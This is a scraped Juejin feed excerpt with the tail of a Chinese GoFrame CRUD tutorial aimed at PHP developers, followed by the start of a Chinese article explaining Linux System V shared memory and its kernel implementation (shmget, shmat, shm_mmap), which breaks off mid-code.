    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        r.Response.WriteJsonExit(g.Map{
            <span class="hljs-string">"code"</span>: <span class="hljs-number">500</span>,
            <span class="hljs-string">"msg"</span>:  <span class="hljs-string">"创建失败："</span> + err.Error(),
        })
    }
    id, _ := result.LastInsertId()
    r.Response.WriteJsonExit(g.Map{
        <span class="hljs-string">"code"</span>: <span class="hljs-number">200</span>,
        <span class="hljs-string">"msg"</span>:  <span class="hljs-string">"创建成功"</span>,
        <span class="hljs-string">"data"</span>: g.Map{<span class="hljs-string">"id"</span>: id},
    })
}

<span class="hljs-comment">// 获取单个用户</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *UserController)</span></span> Show(r *ghttp.Request) {
    id := r.GetInt(<span class="hljs-string">"id"</span>)
    user, err := g.Model(<span class="hljs-string">"user"</span>).Where(<span class="hljs-string">"id"</span>, id).One()
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        r.Response.WriteJsonExit(g.Map{
            <span class="hljs-string">"code"</span>: <span class="hljs-number">500</span>,
            <span class="hljs-string">"msg"</span>:  <span class="hljs-string">"查询失败："</span> + err.Error(),
        })
    }
    <span class="hljs-keyword">if</span> user.IsEmpty() {
        r.Response.WriteJsonExit(g.Map{
            <span class="hljs-string">"code"</span>: <span class="hljs-number">404</span>,
            <span class="hljs-string">"msg"</span>:  <span class="hljs-string">"用户不存在"</span>,
        })
    }
    r.Response.WriteJsonExit(g.Map{
        <span class="hljs-string">"code"</span>: <span class="hljs-number">200</span>,
        <span class="hljs-string">"msg"</span>:  <span class="hljs-string">"查询成功"</span>,
        <span class="hljs-string">"data"</span>: user,
    })
}

<span class="hljs-comment">// 其他方法（Update、Delete、List）类似，此处省略...</span>
</code></pre>
<h3 data-id="heading-17">7. 启动测试</h3>
<p>执行<code>gf run</code>启动项目，通过<strong>Postman或curl</strong>测试接口：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 测试创建用户</span>
curl -X POST http://127.0.0.1:8080/api/v1/users \
-H <span class="hljs-string">"Content-Type: application/json"</span> \
-d <span class="hljs-string">'{"name":"test","email":"test@example.com"}'</span>
</code></pre>
<p>返回如下结果即表示成功：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span><span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span><span class="hljs-number">200</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"msg"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"创建成功"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">{</span><span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-18">四、谁该选择GoFrame？</h2>
<p>经过<strong>3年多的实战体验</strong>，我认为以下几类开发者/团队<strong>最适合使用GoFrame</strong>：</p>
<ol>
<li><strong>PHP/Laravel转Go的开发者</strong>：最低学习成本，最快上手速度，无需重构开发思维；</li>
<li><strong>追求"开发效率+运行性能"的团队</strong>：既想要Laravel式的高效开发，又需要应对高并发场景；</li>
<li><strong>微服务架构项目</strong>：模块化设计适合拆分部署，Go语言的轻量特性降低服务运维成本；</li>
<li><strong>国内中小企业</strong>：中文文档+活跃社区，解决问题更高效，无需依赖海外资源。</li>
</ol>
<p>当然，GoFrame<strong>并非万能</strong>。如果只是开发一个<strong>极简的静态网站或个人工具</strong>，Gin等轻量框架可能更合适；如果项目涉及<strong>复杂的领域驱动设计</strong>，可能需要结合其他工具补充。但对于<strong>绝大多数Web开发场景</strong>，GoFrame的"<strong>不折腾</strong>"哲学——提供全套解决方案但不捆绑开发者——都能带来<strong>极佳的体验</strong>。</p>
<h2 data-id="heading-19">五、最后建议</h2>
<p>如果你正打算从PHP转向Go，或者正在为Go项目选择框架，不妨花一个周末的时间<strong>试试GoFrame</strong>：</p>
<ol>
<li>从<a href="https://link.juejin.cn?target=https%3A%2F%2Fgoframe.org%2F" target="_blank" title="https://goframe.org/" ref="nofollow noopener noreferrer">官方文档</a>的"<strong>快速开始</strong>"入手，熟悉核心概念；</li>
<li>用<code>gf</code>工具创建一个demo项目，亲手实现<strong>简单的CRUD</strong>；</li>
<li>遇到问题时，优先查看GitHub的issue和社区讨论，大部分常见问题都有<strong>成熟解决方案</strong>。</li>
</ol>
<p>就像Laravel当年让PHP开发变得优雅一样，GoFrame也正在让Go的Web开发变得<strong>更高效、更愉悦</strong>。对于PHP开发者而言，它不仅是一个框架，更是一座通往Go语言世界的"<strong>无缝桥梁</strong>"。不妨现在就动手试试，相信你会和我一样，爱上这种"<strong>Laravel式体验+Go级性能</strong>"的开发快感。</p>
<h3 data-id="heading-20">互动话题（欢迎评论区交流）</h3>
<ol>
<li>你也是 PHP 转 Go 的开发者吗？踩过哪些框架坑？</li>
<li>你用 GoFrame 做过哪些项目？有没有隐藏技巧可以分享？</li>
<li>下期想我拆解 GoFrame 的哪个功能？（比如权限控制、微服务部署、日志排查）</li>
</ol>
<p>关注我，后续持续输出 GoFrame 实战干货、PHP 转 Go 避坑指南，还有商业项目中的真实案例拆解，帮你快速从 "Go 新手" 熬成 "Go 熟手"💪</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Linux 共享内存详解]]></title>    <link>https://juejin.cn/post/7584059298696282153</link>    <guid>https://juejin.cn/post/7584059298696282153</guid>    <pubDate>2025-12-16T07:28:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584059298696282153" data-draft-id="7584007232411680774" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Linux 共享内存详解"/> <meta itemprop="keywords" content="嵌入式"/> <meta itemprop="datePublished" content="2025-12-16T07:28:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Shawn_CH"/> <meta itemprop="url" content="https://juejin.cn/user/4074114702122217"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Linux 共享内存详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4074114702122217/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Shawn_CH
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:28:06.000Z" title="Tue Dec 16 2025 07:28:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读25分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 概述</h2>
<h3 data-id="heading-1">1.1 什么是共享内存？</h3>
<p><strong>共享内存的定义</strong>：</p>
<p>共享内存（Shared Memory）是一种进程间通信（IPC）机制，允许多个进程访问同一块物理内存区域。这是最快的 IPC 方式，因为数据不需要在内核和用户空间之间复制。</p>
<p><strong>共享内存的特点</strong>：</p>
<ol>
<li><strong>高性能</strong>：数据直接映射到进程地址空间，无需复制</li>
<li><strong>低延迟</strong>：访问速度接近直接内存访问</li>
<li><strong>大容量</strong>：可以共享大量数据</li>
<li><strong>持久性</strong>：数据在进程退出后仍然存在（直到显式删除）</li>
</ol>
<p><strong>共享内存的用途</strong>：</p>
<ol>
<li><strong>高性能数据传输</strong>：进程间大量数据交换</li>
<li><strong>数据库系统</strong>：共享缓存和缓冲区</li>
<li><strong>图形系统</strong>：共享图形缓冲区</li>
<li><strong>科学计算</strong>：共享计算结果</li>
</ol>
<h3 data-id="heading-2">1.2 Linux 中的共享内存类型</h3>
<p>Linux 提供了两种主要的共享内存机制：</p>
<ol>
<li>
<p><strong>System V 共享内存</strong>：</p>
<ul>
<li><strong>API</strong>：<code>shmget()</code>, <code>shmat()</code>, <code>shmdt()</code>, <code>shmctl()</code></li>
<li><strong>特点</strong>：传统的 IPC 机制，基于键值（key）</li>
<li><strong>实现</strong>：基于 <code>tmpfs</code> 文件系统</li>
</ul>
</li>
<li>
<p><strong>POSIX 共享内存</strong>：</p>
<ul>
<li><strong>API</strong>：<code>shm_open()</code>, <code>shm_unlink()</code>, <code>mmap()</code></li>
<li><strong>特点</strong>：POSIX 标准，基于文件名</li>
<li><strong>实现</strong>：基于 <code>tmpfs</code> 文件系统（通常挂载在 <code>/dev/shm</code>）</li>
</ul>
</li>
<li>
<p><strong>内存映射文件（mmap）</strong>：</p>
<ul>
<li><strong>API</strong>：<code>mmap()</code>, <code>munmap()</code></li>
<li><strong>特点</strong>：可以映射文件或匿名内存</li>
<li><strong>实现</strong>：直接内存映射</li>
</ul>
</li>
</ol>
<h3 data-id="heading-3">1.3 共享内存与普通内存的区别</h3>






























<table><thead><tr><th>特性</th><th>普通内存</th><th>共享内存</th></tr></thead><tbody><tr><td><strong>可见性</strong></td><td>仅当前进程可见</td><td>多个进程可见</td></tr><tr><td><strong>生命周期</strong></td><td>进程退出时释放</td><td>显式删除或系统重启</td></tr><tr><td><strong>访问方式</strong></td><td>直接访问</td><td>需要先 attach</td></tr><tr><td><strong>同步</strong></td><td>不需要</td><td>需要同步机制（信号量、锁等）</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-4">2. System V 共享内存</h2>
<h3 data-id="heading-5">2.1 System V 共享内存 API</h3>
<p><strong>核心系统调用</strong>：</p>
<ol>
<li><strong><code>shmget()</code></strong>：创建或获取共享内存段</li>
<li><strong><code>shmat()</code></strong>：将共享内存段附加到进程地址空间</li>
<li><strong><code>shmdt()</code></strong>：从进程地址空间分离共享内存段</li>
<li><strong><code>shmctl()</code></strong>：控制共享内存段（获取信息、设置权限、删除等）</li>
</ol>
<p><strong>函数原型</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span>

<span class="hljs-comment">// 创建或获取共享内存段</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">shmget</span><span class="hljs-params">(<span class="hljs-type">key_t</span> key, <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> shmflg)</span>;

<span class="hljs-comment">// 附加共享内存段到进程地址空间</span>
<span class="hljs-type">void</span> *<span class="hljs-title function_">shmat</span><span class="hljs-params">(<span class="hljs-type">int</span> shmid, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *shmaddr, <span class="hljs-type">int</span> shmflg)</span>;

<span class="hljs-comment">// 从进程地址空间分离共享内存段</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">shmdt</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *shmaddr)</span>;

<span class="hljs-comment">// 控制共享内存段</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">shmctl</span><span class="hljs-params">(<span class="hljs-type">int</span> shmid, <span class="hljs-type">int</span> cmd, <span class="hljs-keyword">struct</span> shmid_ds *buf)</span>;
</code></pre>
<h3 data-id="heading-6">2.2 shmget() 的实现原理</h3>
<p><strong>shmget() 的作用</strong>：</p>
<p>创建新的共享内存段或获取已存在的共享内存段的标识符。</p>
<p><strong>内核实现</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
SYSCALL_DEFINE3(shmget, <span class="hljs-type">key_t</span>, key, <span class="hljs-type">size_t</span>, size, <span class="hljs-type">int</span>, shmflg)
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span>
    <span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_ops</span> <span class="hljs-title">shm_ops</span> =</span> {
        .getnew = newseg,  <span class="hljs-comment">// 创建新段</span>
        .associate = security_shm_associate,
        .more_checks = shm_more_checks,
    };
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_params</span> <span class="hljs-title">shm_params</span>;</span>
    
    ns = current-&gt;nsproxy-&gt;ipc_ns;
    
    shm_params.key = key;
    shm_params.flg = shmflg;
    shm_params.u.size = size;
    
    <span class="hljs-keyword">return</span> ipcget(ns, &amp;shm_ids(ns), &amp;shm_ops, &amp;shm_params);
}
</code></pre>
<p><strong>newseg() 函数</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">newseg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ipc_namespace *ns, <span class="hljs-keyword">struct</span> ipc_params *params)</span>
{
    <span class="hljs-type">key_t</span> key = params-&gt;key;
    <span class="hljs-type">int</span> shmflg = params-&gt;flg;
    <span class="hljs-type">size_t</span> size = params-&gt;u.size;
    <span class="hljs-type">int</span> error;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_kernel</span> *<span class="hljs-title">shp</span>;</span>
    <span class="hljs-type">size_t</span> numpages = (size + PAGE_SIZE - <span class="hljs-number">1</span>) &gt;&gt; PAGE_SIZE;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span>
    <span class="hljs-type">char</span> name[<span class="hljs-number">12</span>];
    <span class="hljs-type">int</span> id;
    <span class="hljs-type">void</span> *user_memory;
    
    <span class="hljs-comment">// 1. 检查大小限制</span>
    <span class="hljs-keyword">if</span> (size &lt; SHMMIN || size &gt; ns-&gt;shm_ctlmax)
        <span class="hljs-keyword">return</span> -EINVAL;
    
    <span class="hljs-comment">// 2. 分配 shmid_kernel 结构</span>
    shp = kvmalloc(<span class="hljs-keyword">sizeof</span>(*shp), GFP_KERNEL);
    <span class="hljs-keyword">if</span> (!shp)
        <span class="hljs-keyword">return</span> -ENOMEM;
    
    <span class="hljs-comment">// 3. 创建 tmpfs 文件</span>
    <span class="hljs-built_in">sprintf</span>(name, <span class="hljs-string">"SYSV%08x"</span>, key);
    file = shmem_kernel_file_setup(name, size, acctflag);
    <span class="hljs-keyword">if</span> (IS_ERR(file)) {
        error = PTR_ERR(file);
        <span class="hljs-keyword">goto</span> no_file;
    }
    
    <span class="hljs-comment">// 4. 初始化 shmid_kernel 结构</span>
    shp-&gt;shm_file = file;
    shp-&gt;shm_perm.key = key;
    shp-&gt;shm_perm.mode = (shmflg &amp; S_IRWXUGO);
    shp-&gt;shm_perm.security = <span class="hljs-literal">NULL</span>;
    shp-&gt;shm_segsz = size;
    shp-&gt;shm_nattch = <span class="hljs-number">0</span>;
    shp-&gt;shm_atim = <span class="hljs-number">0</span>;
    shp-&gt;shm_dtim = <span class="hljs-number">0</span>;
    shp-&gt;shm_ctim = ktime_get_real_seconds();
    shp-&gt;shm_cprid = get_pid(task_tgid(current));
    shp-&gt;shm_lprid = <span class="hljs-literal">NULL</span>;
    shp-&gt;shm_ns = ns;
    
    <span class="hljs-comment">// 5. 注册到 IPC 命名空间</span>
    id = ipc_addid(&amp;shm_ids(ns), &amp;shp-&gt;shm_perm, ns-&gt;shm_ctlmni);
    <span class="hljs-keyword">if</span> (id &lt; <span class="hljs-number">0</span>) {
        error = id;
        <span class="hljs-keyword">goto</span> no_id;
    }
    
    <span class="hljs-comment">// 6. 更新命名空间统计</span>
    ns-&gt;shm_tot += numpages;
    
    <span class="hljs-keyword">return</span> id;
}
</code></pre>
<p><strong>关键步骤说明</strong>：</p>
<ol>
<li>
<p><strong>大小检查</strong>：</p>
<ul>
<li><strong>SHMMIN</strong>：最小共享内存段大小（通常 1 字节）</li>
<li><strong>shm_ctlmax</strong>：最大共享内存段大小（可通过 <code>sysctl</code> 配置）</li>
</ul>
</li>
<li>
<p><strong>创建 tmpfs 文件</strong>：</p>
<ul>
<li><strong><code>shmem_kernel_file_setup()</code></strong>：在 tmpfs 文件系统中创建文件</li>
<li><strong>文件名</strong>：<code>SYSV</code> + 8 位十六进制 key</li>
<li><strong>作用</strong>：共享内存段实际上是一个 tmpfs 文件</li>
</ul>
</li>
<li>
<p><strong>初始化结构</strong>：</p>
<ul>
<li><strong><code>shmid_kernel</code></strong>：内核中的共享内存段结构</li>
<li><strong><code>shm_perm</code></strong>：IPC 权限结构</li>
<li><strong><code>shm_file</code></strong>：指向 tmpfs 文件的指针</li>
</ul>
</li>
<li>
<p><strong>注册到 IPC 命名空间</strong>：</p>
<ul>
<li><strong><code>ipc_addid()</code></strong>：分配唯一的共享内存 ID</li>
<li><strong>作用</strong>：将共享内存段添加到命名空间的 ID 表中</li>
</ul>
</li>
</ol>
<h3 data-id="heading-7">2.3 shmat() 的实现原理</h3>
<p><strong>shmat() 的作用</strong>：</p>
<p>将共享内存段附加到调用进程的地址空间，返回映射的虚拟地址。</p>
<p><strong>内核实现</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-type">long</span> <span class="hljs-title function_">do_shmat</span><span class="hljs-params">(<span class="hljs-type">int</span> shmid, <span class="hljs-type">char</span> __user *shmaddr, <span class="hljs-type">int</span> shmflg, ulong *raddr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> shmlba)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_kernel</span> *<span class="hljs-title">shp</span>;</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)shmaddr;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span>
    <span class="hljs-type">int</span>    err;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags = MAP_SHARED;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> prot;
    <span class="hljs-type">int</span> acc_mode;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shm_file_data</span> *<span class="hljs-title">sfd</span>;</span>
    <span class="hljs-type">int</span> f_flags;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> populate = <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// 1. 获取共享内存段</span>
    ns = current-&gt;nsproxy-&gt;ipc_ns;
    shp = shm_obtain_object_check(ns, shmid);
    <span class="hljs-keyword">if</span> (IS_ERR(shp))
        <span class="hljs-keyword">return</span> PTR_ERR(shp);
    
    <span class="hljs-comment">// 2. 检查权限</span>
    err = -EACCES;
    <span class="hljs-keyword">if</span> (ipcperms(ns, &amp;shp-&gt;shm_perm, acc_mode))
        <span class="hljs-keyword">goto</span> out_unlock;
    
    <span class="hljs-comment">// 3. 检查大小</span>
    err = -EINVAL;
    size = i_size_read(file_inode(shp-&gt;shm_file));
    <span class="hljs-keyword">if</span> (size &lt; SHMMIN || size &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ns-&gt;shm_ctlmax)
        <span class="hljs-keyword">goto</span> out_unlock;
    
    <span class="hljs-comment">// 4. 创建 shm_file_data 结构</span>
    sfd = kvmalloc(<span class="hljs-keyword">sizeof</span>(*sfd), GFP_KERNEL);
    <span class="hljs-keyword">if</span> (!sfd) {
        err = -ENOMEM;
        <span class="hljs-keyword">goto</span> out_unlock;
    }
    
    file = alloc_file_clone(shp-&gt;shm_file, f_flags,
                            is_file_hugepages(shp-&gt;shm_file) ?
                            &amp;shm_file_operations_huge :
                            &amp;shm_file_operations);
    <span class="hljs-keyword">if</span> (IS_ERR(file)) {
        err = PTR_ERR(file);
        <span class="hljs-keyword">goto</span> out_freed;
    }
    
    sfd-&gt;id = shp-&gt;shm_perm.id;
    sfd-&gt;ns = get_ipc_ns(ns);
    sfd-&gt;file = shp-&gt;shm_file;
    sfd-&gt;vm_ops = <span class="hljs-literal">NULL</span>;
    file-&gt;private_data = sfd;
    
    <span class="hljs-comment">// 5. 执行内存映射</span>
    err = do_mmap_pgoff(file, addr, size, prot, flags, <span class="hljs-number">0</span>, &amp;populate, <span class="hljs-literal">NULL</span>);
    *raddr = addr;
    
    <span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>) {
        fput(file);
        <span class="hljs-keyword">goto</span> out_nattch;
    }
    
    <span class="hljs-comment">// 6. 更新统计信息</span>
    shp-&gt;shm_nattch++;
    shp-&gt;shm_atim = ktime_get_real_seconds();
    ipc_update_pid(&amp;shp-&gt;shm_lprid, task_tgid(current));
    
    <span class="hljs-keyword">return</span> err;
}
</code></pre>
<p><strong>关键步骤说明</strong>：</p>
<ol>
<li>
<p><strong>获取共享内存段</strong>：</p>
<ul>
<li><strong><code>shm_obtain_object_check()</code></strong>：从 IPC 命名空间获取共享内存段</li>
<li><strong>检查</strong>：验证 ID 是否有效</li>
</ul>
</li>
<li>
<p><strong>权限检查</strong>：</p>
<ul>
<li><strong><code>ipcperms()</code></strong>：检查进程是否有权限访问共享内存段</li>
<li><strong>权限</strong>：读、写权限</li>
</ul>
</li>
<li>
<p><strong>创建文件描述符</strong>：</p>
<ul>
<li><strong><code>alloc_file_clone()</code></strong>：为共享内存段创建文件描述符</li>
<li><strong>作用</strong>：每个进程都有独立的文件描述符，但指向同一个文件</li>
</ul>
</li>
<li>
<p><strong>内存映射</strong>：</p>
<ul>
<li><strong><code>do_mmap_pgoff()</code></strong>：将文件映射到进程地址空间</li>
<li><strong>标志</strong>：<code>MAP_SHARED</code> 表示共享映射</li>
<li><strong>结果</strong>：返回映射的虚拟地址</li>
</ul>
</li>
<li>
<p><strong>更新统计</strong>：</p>
<ul>
<li><strong><code>shm_nattch</code></strong>：附加计数加 1</li>
<li><strong><code>shm_atim</code></strong>：更新最后附加时间</li>
<li><strong><code>shm_lprid</code></strong>：更新最后附加进程 ID</li>
</ul>
</li>
</ol>
<h3 data-id="heading-8">2.4 shm_mmap() 的实现原理</h3>
<p><strong>shm_mmap() 的作用</strong>：</p>
<p>当进程调用 <code>mmap()</code> 映射共享内存文件时，内核会调用 <code>shm_mmap()</code> 来处理映射。</p>
<p><strong>内核实现</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">shm_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shm_file_data</span> *<span class="hljs-title">sfd</span> =</span> shm_file_data(file);
    <span class="hljs-type">int</span> ret;
    
    <span class="hljs-comment">// 1. 打开共享内存段（增加引用计数）</span>
    ret = __shm_open(vma);
    <span class="hljs-keyword">if</span> (ret)
        <span class="hljs-keyword">return</span> ret;
    
    <span class="hljs-comment">// 2. 调用底层文件的 mmap</span>
    ret = call_mmap(sfd-&gt;file, vma);
    <span class="hljs-keyword">if</span> (ret) {
        shm_close(vma);
        <span class="hljs-keyword">return</span> ret;
    }
    
    <span class="hljs-comment">// 3. 保存原始 vm_ops，替换为 shm_vm_ops</span>
    sfd-&gt;vm_ops = vma-&gt;vm_ops;
    vma-&gt;vm_ops = &amp;shm_vm_ops;
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>__shm_open() 函数</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
